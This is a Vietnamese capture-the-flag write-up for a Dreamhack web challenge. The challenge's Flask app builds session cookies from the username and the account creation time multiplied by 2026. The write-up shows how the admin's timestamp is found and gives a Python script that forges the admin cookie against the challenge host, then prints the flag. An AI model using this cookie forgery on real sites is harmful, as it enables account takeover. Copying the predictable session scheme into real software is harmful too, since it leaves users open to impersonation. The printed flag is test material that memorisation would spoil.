# What time is it?

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

## ANALYZE

đầu tiên thì để có được FLAG ta phải login vào được với tài khoản user admin

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

```python
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return render_template("register.html")

    username = request.form.get("username").strip()
    pw = request.form.get("password")

    if not username or not pw:
        return redirect(url_for("register"))
    if username in users:
        return "Already exists"

    created_at = int(time.time())
    add_user(username, pw, created_at)

    resp = make_response(redirect(url_for("welcome")))
    resp.set_cookie("session", sess.make_session(username, created_at))
    return resp
```

tiếp theo là trong route /register , thì ta thấy được ở dòng cuối đã call đến hàm make\_session

khi folow đến cái hàm đấy thì ra có được cơ chế tạo phiên của web&#x20;

```python
def make_session(username: str, created_at: int) -> str:
    return f"{username}.{created_at * 2026}"
```

Và tôi sẽ tiến hành dựng ở local lên để test thử ,

sau khi tạo 1 tài khoản bất kì thì ta đã có thể xem được thông tin về thời gian tạo tài khoản của cả admin và ta&#x20;

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

```
from datetime import datetime, timezone
print(int(datetime(2026, 1, 31, 15, 30, 48, tzinfo=timezone.utc).timestamp()))"
```

Và nếu theo cơ chế kia thì session của tài khoản cac sẽ là :&#x20;

```
cac.2026*1769873448
```

vậy ta sẽ tiến hành áp dụng với tài khoản admin

```
admin.2026*1769873219 ---> admin.3585763141694
```

và BOom ta đã truy cập được vào tài khoản admin và lấy dc flag&#x20;

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

## EXPLOIT



<figure><img src="../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

vậy ta có thể tính dc seesion của admin :&#x20;

script

<pre><code>from datetime import datetime, timezone
import requests
import re
a =int(datetime(2026, 1, 31, 16, 9, 49, tzinfo=timezone.utc).timestamp())
b = f"admin.{a * 2026}"

<strong>
</strong>session = requests.session()

burp0_url = "http://host3.dreamhack.games:15563/"
burp0_cookies = {"session": b}
burp0_headers = {"sec-ch-ua": "\"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:5000/welcome", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
resp = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
print(re.search(r"DH\{.*\}", resp.text).group())
</code></pre>

```
"d:/Downloads/Deamhack/LVL1/What time is it/exploit.py"
DH{It_is_time_t0_s1eep~_~}
```

## FLAG

```
DH{It_is_time_t0_s1eep~_~}
```

